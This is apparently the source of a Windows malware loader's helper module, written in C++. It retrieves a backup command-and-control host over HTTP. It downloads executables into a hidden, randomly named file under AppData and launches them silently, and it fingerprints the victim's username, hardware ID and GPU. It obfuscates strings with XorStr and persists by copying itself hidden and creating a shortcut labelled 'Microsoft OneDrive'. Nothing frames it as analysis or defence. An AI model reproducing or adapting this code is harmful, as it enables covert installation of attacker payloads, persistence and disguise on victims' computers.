#define _CRT_SECURE_NO_WARNINGS
#include "Tools.h"
#include <comdef.h>
#include <Wbemidl.h>
#include <wininet.h>

#pragma comment(lib,"wininet")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment (lib, "urlmon.lib")

void GetBackUpHost(char* szNewHost) {	
	HINTERNET hInternet = ::InternetOpen(TEXT(XorStr("WinInet Test")), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL) return;

	HINTERNET hConnect = ::InternetConnect(hInternet, BACKUPHOST, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1u);
	if (hConnect == NULL) return;

	HINTERNET hRequest = ::HttpOpenRequest(hConnect, TEXT(XorStr("GET")), BACKUPPATH, NULL, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION, 1);
	if (hRequest == NULL) return;

	BOOL bSend = ::HttpSendRequest(hRequest, NULL, 0, NULL, 0);
	if (!bSend) return;

	for (;;) {
		char  szData[1024];
		DWORD dwBytesRead;
		BOOL bRead = InternetReadFile(hRequest, szData, sizeof(szData) - 1, &dwBytesRead);

		if (bRead == FALSE || dwBytesRead == 0) {
			break;
		}

		szData[dwBytesRead] = 0;
		lstrcat(szNewHost, szData);
	}

	::InternetCloseHandle(hRequest);
	::InternetCloseHandle(hConnect);
	::InternetCloseHandle(hInternet);
	
}

void DownloadAndStart(char* URL) {
	char szLoadedFilePath[MAX_PATH + 1];

	lstrcpy(szLoadedFilePath, szAppdata);
	lstrcat(szLoadedFilePath, XorStr("\\Microsoft\\Windows\\"));
	char* randomName = (char*)malloc(11);
	RandomString(randomName, 10);
	lstrcat(szLoadedFilePath, randomName);
	lstrcat(szLoadedFilePath, XorStr(".exe"));

	#ifdef _DEBUG
			print("Loaded file path");
			print(szLoadedFilePath);
	#endif

	HRESULT hr = URLDownloadToFileA(NULL, URL, szLoadedFilePath, 0, 0);
	#ifdef _DEBUG
			print("Downloaded...");
			print(URL);
	#endif

	SetFileAttributes(szLoadedFilePath, FILE_ATTRIBUTE_HIDDEN);
	ShellExecuteA(NULL, XorStr("open"), szLoadedFilePath, NULL, NULL, 0);

	#ifdef _DEBUG
			print("Runned...");
	#endif
}

void RandomString(char* s, const int len) {
    srand(time(NULL));
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < len; ++i) {
        s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    s[len] = 0;
}

void _GetUserName(char* returnval)
{
    DWORD bufferlen = 257;
    GetUserName(returnval, &bufferlen);
}

void _GetHwid(char* returnval)
{
	HW_PROFILE_INFOA hpi;
	ZeroMemory(&hpi, sizeof(HW_PROFILE_INFOA));
	GetCurrentHwProfileA(&hpi);
	lstrcpy(returnval, hpi.szHwProfileGuid);
}

void _GetGPU(char* returnval)
{
	ZeroMemory(returnval, 199);
	HRESULT hres;
	hres = CoInitializeEx(0, COINIT_MULTITHREADED);
	if (FAILED(hres)) return;
	hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
	if (FAILED(hres)) { CoUninitialize(); return; }
	IWbemLocator* pLoc = NULL;
	hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
	if (FAILED(hres)) { CoUninitialize(); return; }
	IWbemServices* pSvc = NULL;
	hres = pLoc->ConnectServer(_bstr_t(L"root\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
	if (FAILED(hres)) { pLoc->Release(); CoUninitialize(); return; }
	hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
	if (FAILED(hres)) { pSvc->Release(); pLoc->Release(); CoUninitialize(); return; }
	IEnumWbemClassObject* pEnumerator = NULL;
	hres = pSvc->ExecQuery(bstr_t("WQL"),
		bstr_t(XorStr("SELECT * FROM Win32_VideoController")),
		WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
	if (FAILED(hres)) { pSvc->Release(); pLoc->Release(); CoUninitialize(); return; }
	IWbemClassObject* pclsObj = (IWbemClassObject*)malloc(sizeof(IWbemClassObject));

	ULONG uReturn = 0;
	bool passed = false;
	while (pEnumerator)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
		if (0 == uReturn)break;
		VARIANT vtProp;
		hr = pclsObj->Get(L"Caption", 0, &vtProp, 0, 0);
		std::wstring wGpuName = vtProp.bstrVal;
		int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wGpuName[0], (int)wGpuName.size(), NULL, 0, NULL, NULL);
		std::string strTo(size_needed, 0);
		WideCharToMultiByte(CP_UTF8, 0, &wGpuName[0], (int)wGpuName.size(), &strTo[0], size_needed, NULL, NULL);
		if (!passed)
			lstrcpy(returnval, strTo.c_str());
		else
			lstrcpy(returnval + size_needed, strTo.c_str());
		passed = true;
		VariantClear(&vtProp);
	}
	pSvc->Release();
	pLoc->Release();
	pEnumerator->Release();
	pclsObj->Release();
	CoUninitialize();

	return;
}

BOOL CreateShortCut(char* exe, char* lnk)
{
	IShellLink* pLink;
	IPersistFile* pPersistFile;

	if (SUCCEEDED(CoInitialize(NULL)))
	{
		if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL,
			CLSCTX_INPROC_SERVER,
			IID_IShellLink, (void**)&pLink)))
		{
			pLink->SetPath(exe);
			pLink->SetDescription(XorStr("Microsoft OneDrive"));
			pLink->SetShowCmd(SW_SHOW);


			if (SUCCEEDED(pLink->QueryInterface(IID_IPersistFile,
				(void**)&pPersistFile)))
			{
				wchar_t  wsz[MAX_PATH];
				MultiByteToWideChar(CP_ACP, 0, lnk, -1, wsz, MAX_PATH);
				pPersistFile->Save(wsz, TRUE);
				pPersistFile->Release();
				return TRUE;
			}
			pLink->Release();
		}
		CoUninitialize();
	}
	return FALSE;
}

void DeleteOldFiles() {
	TCHAR szPattern[MAX_PATH + 1];

	lstrcpy(szPattern, szKeys);
	lstrcat(szPattern, XorStr("*.exe"));

	WIN32_FIND_DATA FindFileData;
	HANDLE hf;
	hf = FindFirstFile(szPattern, &FindFileData);
	if (hf != INVALID_HANDLE_VALUE) {
		do {

			if (strstr(FindFileData.cFileName, XorStr("StandaloneUpdater"))) {
				TCHAR szFile[MAX_PATH + 1];
				lstrcpy(szFile, szKeys);
				lstrcat(szFile, FindFileData.cFileName);
				#ifdef _DEBUG
									print("Deleted old build");
									print(szFile);

				#endif
				remove(szFile);
			}
		} while (FindNextFile(hf, &FindFileData) != 0);
		FindClose(hf);
	}

	remove(szPingFile);

	#ifdef _DEBUG
		print("Deleted ping file...");
	#endif

	remove(szLnkFile);

	#ifdef _DEBUG
		print("Deleted LNK file...");
	#endif
}

void AutoRun() {
	if (GetFileAttributes(szPingFile) != INVALID_FILE_ATTRIBUTES) return;

    TCHAR szExeName[MAX_PATH + 1];
    HKEY hKey = NULL;

	GetModuleFileName(NULL, szExeName, STRLEN(szExeName));
	if (0 == CopyFile(szExeName, szMainFile, FALSE)) return;

	auto IsLnkCreated = CreateShortCut(szMainFile, szLnkFile);

	#ifdef _DEBUG
		print("Exe path");
		print(szMainFile);
		print("Lnk path");
		print(szLnkFile);
	#endif

	SetFileAttributes(szMainFile, FILE_ATTRIBUTE_HIDDEN);

	if (IsLnkCreated) {
		HANDLE Hfile = CreateFile(szPingFile, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CloseHandle(Hfile);
		SetFileAttributes(szPingFile, FILE_ATTRIBUTE_HIDDEN);
	}
    return;
}